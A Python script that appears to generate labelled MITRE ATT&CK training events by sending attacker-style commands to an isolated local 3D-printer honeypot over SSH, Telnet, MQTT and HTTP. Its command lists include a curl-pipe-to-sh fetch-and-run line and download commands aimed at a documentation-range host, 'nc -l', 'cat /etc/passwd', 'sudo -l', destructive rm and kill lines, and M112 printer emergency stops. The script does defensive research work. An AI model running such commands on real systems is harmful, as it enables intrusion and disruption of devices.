"""Generate labelled loopback events for MITRE techniques the dataset lacks.

Run against one isolated HoneyPrint custom-lab instance (SSH, Telnet and MQTT
enabled). Every connection goes to 127.0.0.1. The decoy consoles never run a
host shell, and URLs use the reserved documentation range 198.51.100.0/24, so
no download takes place. Labels are the controlled scenario's MITRE label.

Techniques covered: T1016, T1049, T1105, T1059.004, Telnet discovery
(T1083/T1057/T1033/T1082/T1005/T1548.003), T1018 MQTT enumeration and
T1529 emergency stop, plus benign Telnet and MQTT activity for balance.

    HONEYPRINT_RESEARCH_PASSWORD=... python research/generate_mitre_gaps.py \
        --instance custom_mitre --port 18181 --ssh-port 12223 --telnet-port 12323 \
        --mqtt-port 11884 --database .honeyprint/mitre-gaps/events.sqlite3 \
        --labels .honeyprint/mitre-gaps/labels.csv --run-id r1
"""

import argparse
import csv
import os
from pathlib import Path
import socket
import subprocess
import sys
import time

sys.path.insert(0, str(Path(__file__).resolve().parent))
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from generate_local_dataset import events_after, last_sequence, request, ssh_command, ssh_connect
from dashboard.taxonomy import BENIGN, shell_technique

USER = 'research'
NET_CONFIG = ['ifconfig', 'ip addr', 'route -n', 'ip route', 'ifconfig -a']
NET_CONN = ['netstat -an', 'ss -tulpn', 'netstat -tlnp', 'ss -s']
DOWNLOAD = ['wget http://198.51.100.7/x.sh', 'curl -O http://198.51.100.7/m.bin',
            'tftp -g -r p 198.51.100.7', 'scp user@198.51.100.7:a .', 'curl -s http://198.51.100.7/i | sh']
OTHER_SHELL = ['bash', 'sh -c id', 'python3 -c 1', 'chmod +x a.sh', 'rm -rf /tmp/x', 'echo hi',
               'busybox', 'nc -l 4444', 'history', 'crontab -l', 'mkdir /tmp/.x', 'kill -9 1']
TELNET_DISCOVERY = ['ls', 'ls -la /', 'find / -name "*.gcode"', 'pwd', 'ps aux', 'whoami', 'id',
                    'uname -a', 'env', 'cat /etc/passwd', 'sudo -l', 'netstat -an', 'ifconfig']
TELNET_BENIGN = ['status', 'temperature', 'position', 'job', 'files', 'help']
MQTT_ENUM = ['#', '$SYS/#', '+/#', 'honeyprint/#', 'honeyprint/+/state', '+/+/command']


class Telnet:
    def __init__(self, port, password, user=USER):
        self.sock = socket.create_connection(('127.0.0.1', port), timeout=6)
        self.sock.settimeout(6)
        self.until(b'login: '); self.send(user)
        self.until(b'Password: '); self.send(password)
        self.until(b'$ ')

    def until(self, marker):
        data = bytearray()
        while marker not in data and len(data) < 65536:
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            data.extend(chunk)
        return bytes(data)

    def send(self, line):
        self.sock.sendall((line + '\r\n').encode())

    def run(self, line):
        self.send(line)
        self.until(b'$ ')

    def close(self):
        try:
            self.send('exit')
        finally:
            self.sock.close()


def mqtt_subscribe(port, password, topic, user=USER):
    subprocess.run(['mosquitto_sub', '-h', '127.0.0.1', '-p', str(port), '-u', user, '-P', password,
                    '-t', topic, '-C', '1', '-W', '2'], capture_output=True, timeout=8, check=False)


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    for name in ('port', 'ssh-port', 'telnet-port', 'mqtt-port'):
        parser.add_argument('--' + name, type=int, required=True)
    parser.add_argument('--instance', required=True)
    parser.add_argument('--database', type=Path, required=True)
    parser.add_argument('--labels', type=Path, required=True)
    parser.add_argument('--run-id', required=True)
    parser.add_argument('--repeat', type=int, default=3)
    args = parser.parse_args()
    password = os.environ.get('HONEYPRINT_RESEARCH_PASSWORD')
    if not password or not args.database.is_file():
        parser.error('Set HONEYPRINT_RESEARCH_PASSWORD and start the isolated instance first')
    base = f'http://127.0.0.1:{args.port}'
    rows = []

    def scenario(name, action, select, label_of):
        before = last_sequence(args.database)
        action()
        time.sleep(1.5)
        found = [(seq, e) for seq, e in events_after(args.database, before)
                 if e['instance_id'] == args.instance and select(e)]
        rows.extend({'event_id': e['event_id'], 'sequence': seq, 'run_id': args.run_id,
                     'scenario': name, 'mitre_label': label_of(e)} for seq, e in found)
        print(f'{args.run_id} {name}: {len(found)} events', flush=True)

    def ssh_commands(items):
        with ssh_connect(args.ssh_port, USER, password) as client:
            for _ in range(args.repeat):
                for command in items:
                    ssh_command(client, command)

    def telnet_commands(items):
        session = Telnet(args.telnet_port, password)
        try:
            for _ in range(args.repeat):
                for command in items:
                    session.run(command)
        finally:
            session.close()

    console = lambda e: e['event_type'] in ('ssh.command', 'telnet.command')
    verb_label = lambda e: (BENIGN if str(e['metadata'].get('command', '')).split()[:1] == ['exit']
                            else shell_technique(e['metadata'].get('command', '')))
    scenario('network_configuration_discovery', lambda: ssh_commands(NET_CONFIG), console, lambda e: 'T1016')
    scenario('network_connection_discovery', lambda: ssh_commands(NET_CONN), console, lambda e: 'T1049')
    scenario('ingress_tool_transfer', lambda: ssh_commands(DOWNLOAD), console, lambda e: 'T1105')
    scenario('unix_shell', lambda: ssh_commands(OTHER_SHELL), console, verb_label)
    scenario('telnet_discovery', lambda: telnet_commands(TELNET_DISCOVERY), console, verb_label)
    scenario('telnet_normal_use', lambda: telnet_commands(TELNET_BENIGN), console, lambda e: BENIGN)

    def mqtt_enum():
        for _ in range(args.repeat * 2):
            for topic in MQTT_ENUM:
                mqtt_subscribe(args.mqtt_port, password, topic)

    def mqtt_normal():
        for _ in range(args.repeat * 4):
            mqtt_subscribe(args.mqtt_port, password, f'honeyprint/{args.instance}/#')
            mqtt_subscribe(args.mqtt_port, password, f'honeyprint/{args.instance}/state')

    subscribe = lambda e: e['event_type'] == 'mqtt.subscribe'
    scenario('mqtt_topic_enumeration', mqtt_enum, subscribe, lambda e: 'T1018')
    scenario('mqtt_normal_subscribe', mqtt_normal, subscribe, lambda e: BENIGN)

    def emergency_stop():
        # Last: M112 leaves the virtual printer stopped until the instance restarts.
        for _ in range(args.repeat * 2):
            request(base, '/api/command', {'command': 'M112'})
        with ssh_connect(args.ssh_port, USER, password) as client:
            for _ in range(args.repeat * 2):
                ssh_command(client, 'run M112')
        session = Telnet(args.telnet_port, password)
        try:
            for _ in range(args.repeat * 2):
                session.run('run M112')
        finally:
            session.close()

    scenario('emergency_stop', emergency_stop,
             lambda e: e['event_type'] in ('printer.command', 'ssh.command', 'telnet.command')
             and str(e['metadata'].get('gcode', '')).upper() == 'M112', lambda e: 'T1529')

    args.labels.parent.mkdir(parents=True, exist_ok=True)
    exists = args.labels.is_file()
    with args.labels.open('a', newline='') as destination:
        writer = csv.DictWriter(destination, fieldnames=['event_id', 'sequence', 'run_id', 'scenario', 'mitre_label'])
        if not exists:
            writer.writeheader()
        writer.writerows(rows)
    print(f'{args.run_id}: {len(rows)} labelled events -> {args.labels}')


if __name__ == '__main__':
    main()
